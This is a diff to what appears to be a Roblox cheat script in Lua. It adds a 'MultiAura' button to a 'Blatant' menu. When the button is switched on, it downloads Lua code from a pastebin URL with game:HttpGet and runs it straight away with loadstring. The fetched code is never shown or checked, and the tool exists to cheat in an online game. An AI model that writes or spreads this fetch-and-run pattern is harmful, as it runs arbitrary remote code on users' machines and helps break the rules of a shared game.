@@ -60,3 +60,18 @@ end
 		end,
     ["HoverText"] = "Loads da sape (turn it on every time u go on roblox)."
 })
+
+
+
+
+
+	MultiAura = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
+		["Name"] = "MultiAura",
+		["Function"] = function(callback)
+			if callback then
+   loadstring(game:HttpGet("https://pastebin.com/raw/mLUnn9xw"))()			
+				
+			end
+		end,
+    ["HoverText"] = "A OP MutliAura."
+})
